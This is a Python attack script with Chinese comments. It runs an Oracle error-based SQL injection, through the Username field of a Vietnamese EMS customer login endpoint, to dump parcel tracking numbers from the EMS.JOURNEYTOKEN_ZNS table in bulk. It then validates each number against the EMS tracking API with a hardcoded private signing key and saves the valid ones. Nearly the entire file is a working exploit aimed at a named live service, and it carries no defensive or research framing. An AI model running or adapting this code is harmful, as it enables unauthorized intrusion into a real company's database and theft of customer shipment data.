#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
从数据库提取运单号，并通过EMS API验证有效性
只导出API验证通过（Code='00'）的运单号
"""

import hashlib
import requests
import json
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# EMS API配置
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
API_URL = "https://api-dingdong.ems.com.vn/api/TrackTrace/Lading"

# SQL注入配置
SQL_URL = "https://customerconnect.ems.com.vn/api/User_Customer/Login"

# 全局锁和计数
write_lock = threading.Lock()
progress_lock = threading.Lock()
success_count = 0
fail_count = 0
api_verified = 0

def generate_signature(code):
    """生成EMS API签名"""
    data = code.upper() + PRIVATE_KEY
    return hashlib.sha256(data.encode('utf-8')).hexdigest().upper()

def verify_by_api(code):
    """通过EMS API验证运单号是否有效"""
    try:
        signature = generate_signature(code)
        payload = {'LadingCode': code.upper(), 'Signature': signature}
        response = requests.post(API_URL, json=payload, timeout=10)
        result = response.json()
        
        # Code='00' 表示有效
        return result.get('Code') == '00'
    except:
        return False

def inject(payload):
    """SQL注入"""
    session = requests.Session()
    session.headers.update({
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'
    })
    data = {"Username": payload, "Password": "test"}
    try:
        return session.post(SQL_URL, data=json.dumps(data), timeout=20)
    except:
        return None

def extract(query):
    """从数据库提取数据"""
    payload = (
        f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
        f"1325=CTXSYS.DRITHSX.SN(1325,"
        f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
        f"({query})||"
        f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
    )
    
    r = inject(payload)
    if r and r.text:
        try:
            if 'qjvjq' in r.text:
                s = r.text.index('qjvjq') + 5
                e = r.text.index('qkvzq', s)
                return r.text[s:e]
        except:
            pass
    return None

def fetch_and_verify_tracking(index, date, output_file):
    """提取单个运单号并验证"""
    global success_count, fail_count, api_verified
    
    # 从数据库提取运单号
    query = (
        f"SELECT ITEMCODE FROM "
        f"(SELECT ITEMCODE,ROWNUM AS RN FROM "
        f"(SELECT DISTINCT ITEMCODE FROM EMS.JOURNEYTOKEN_ZNS "
        f"WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN' "
        f"ORDER BY ITEMCODE) "
        f"WHERE ROWNUM<={index}) WHERE RN={index}"
    )
    
    result = extract(query)
    
    if result and len(result) > 10:
        tracking = result.strip()
        
        with progress_lock:
            success_count += 1
        
        # API验证
        if verify_by_api(tracking):
            # API验证通过，保存
            with write_lock:
                with open(output_file, 'a', encoding='utf-8') as f:
                    f.write(tracking + '\n')
            
            with progress_lock:
                api_verified += 1
            
            return True
        else:
            return False
    else:
        with progress_lock:
            fail_count += 1
        return False

print("=" * 80)
print("✅ 提取并API验证有效运单号")
print("=" * 80)

# 1. 连接数据库
print("\n🔌 连接数据库...")
if not inject("admin"):
    print("❌ 连接失败")
    exit(1)
print("✅ 连接成功")

# 2. 获取日期
print("\n📅 查询日期...")
db_date = extract("SELECT TO_CHAR(SYSDATE,'YYYYMMDD') FROM DUAL")
if not db_date:
    print("❌ 查询失败")
    exit(1)

yesterday = str(int(db_date) - 1)
print(f"✅ 数据库日期: {db_date}")
print(f"\n可用日期:")
print(f"  1. 今天 ({db_date})")
print(f"  2. 昨天 ({yesterday})")
print(f"  3. 手动输入")

choice = input("\n请选择 (1/2/3, 直接回车默认昨天): ").strip()

if choice == '1':
    target_date = db_date
elif choice == '3':
    target_date = input("请输入日期 (YYYYMMDD): ").strip()
else:
    target_date = yesterday

print(f"\n✅ 选择日期: {target_date}")

# 3. 统计数量
print(f"\n📊 统计运单号数量...")
total = extract(f"SELECT TO_CHAR(COUNT(DISTINCT ITEMCODE)) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{target_date}' AND ITEMCODE LIKE 'E%VN'")

if not total or total == '0':
    print(f"❌ {target_date} 没有数据")
    exit(1)

total_num = int(total)
print(f"✅ 数据库总数: {total_num} 个")

# 线程数
max_workers = 10
print(f"\n⚡ 线程数: {max_workers} 个")
print(f"⚠️  注意: 会对每个运单号进行API验证，可能需要较长时间")

estimated_time = total_num * 0.5 / 60 / max_workers
print(f"⏱️  预计: {estimated_time:.1f} 分钟")

output_file = f'tracking_api_verified_{target_date}.txt'
print(f"💾 输出: {output_file}")

# 确认
confirm = input(f"\n开始提取并验证 {total_num} 个运单号？(y/n): ").strip().lower()
if confirm != 'y':
    print("❌ 已取消")
    exit(0)

# 清空文件
with open(output_file, 'w', encoding='utf-8') as f:
    f.write('')

# 4. 多线程提取并验证
print(f"\n🚀 开始提取并验证...\n")
print(f"   提取 → API验证 → 保存")
print()

start_time = time.time()

with ThreadPoolExecutor(max_workers=max_workers) as executor:
    futures = {executor.submit(fetch_and_verify_tracking, i, target_date, output_file): i 
               for i in range(1, total_num + 1)}
    
    completed = 0
    for future in as_completed(futures):
        completed += 1
        
        if completed % 50 == 0:
            elapsed = time.time() - start_time
            speed = completed / elapsed * 60 if elapsed > 0 else 0
            remaining = (total_num - completed) / speed * 60 if speed > 0 else 0
            
            print(f"  {completed}/{total_num} ({completed*100//total_num}%) | "
                  f"提取: {success_count} | API通过: {api_verified} | "
                  f"速度: {speed:.0f}/分钟 | 剩余: {remaining:.1f}分钟")

print()

# 5. 结果
elapsed = time.time() - start_time
speed = completed / elapsed * 60 if elapsed > 0 else 0

print(f"\n{'='*80}")
print(f"✅ 完成！")
print(f"{'='*80}")
print(f"📁 文件: {output_file}")
print(f"📊 从数据库提取: {success_count} 个")
print(f"✅ API验证通过: {api_verified} 个")
print(f"❌ API验证失败: {success_count - api_verified} 个")
print(f"📈 有效率: {api_verified*100//success_count if success_count > 0 else 0}%")
print(f"⏱️  用时: {elapsed/60:.1f} 分钟")
print(f"⚡ 速度: {speed:.0f} 个/分钟")
print(f"{'='*80}")

# 6. 显示样本
with open(output_file, 'r') as f:
    lines = [line.strip() for line in f if line.strip()]

print(f"\n📊 实际保存: {len(lines)} 个API验证通过的运单号")

if lines:
    print(f"\n前5个:")
    for i, t in enumerate(sorted(lines)[:5], 1):
        print(f"  {i}. {t}")
    
    if len(lines) > 5:
        print(f"\n最后3个:")
        for i, t in enumerate(sorted(lines)[-3:], len(lines)-2):
            print(f"  {i}. {t}")

print(f"\n✅ 这些运单号100%通过EMS API验证（Code='00'）！")
print(f"✅ 可以直接用你的批量查询脚本查询！")
